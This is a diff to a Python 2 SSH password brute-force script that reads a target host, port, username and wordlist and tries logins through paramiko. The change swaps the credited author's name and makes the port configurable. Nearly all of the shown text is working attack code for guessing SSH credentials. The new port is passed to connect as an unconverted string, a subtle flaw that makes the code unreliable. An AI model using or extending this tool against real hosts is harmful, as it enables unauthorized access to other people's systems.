@@ -1,6 +1,6 @@
 #!/usr/bin/python
 #
-# Author ScianKabestia
+# Author Mikael
 # Version 1.2
 # Python 2.7.x
 # DESCRIPTION: SSH Bruteforce from Wordlist File for IPv4 & IPv6
@@ -16,7 +16,7 @@ import sys
 import os
 import socket
 from termcolor import *
-global host, username, input_file, line
+global host, port, username, input_file, line
 # Global Variables
 
 line = "\n--------------------------------------\n"
@@ -32,7 +32,8 @@ print "------------------------------\n"
 try:    
 	print                    "WARNING: for IPv6 use %interface"
 	print                    "EXAMPLE: fe80::a00:27ff:fee0:8b72%eth0"
-	host= raw_input (colored(     "[+] Enter Target IP/HOSTNAME:" ,'blue'))
+	host= raw_input (colored(     "[+] Enter Target IP/HOSTNAME: " ,'blue'))
+	port= raw_input (colored(     "[+] Enter Port: ", 'blue'))
 	username= raw_input(colored(  "[+] Enter SSH Username: ",'blue'))
 	input_file= raw_input(colored("[+] Enter Wordlist path: ", 'blue'))
 	print                         "[*]... Loading List ..... " 
@@ -49,8 +50,8 @@ def ssh_connect(password, code=0): #[+] Connection Established
 	ssh=paramiko.SSHClient()
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-	try:                      # Port
-		ssh.connect(host, port=22, username=username, password=password)
+	try:       
+		ssh.connect(host, port, username=username, password=password)
 	except paramiko.AuthenticationException:
 		code=1  #[!] Authentication Failled
 	except socket.error, e:
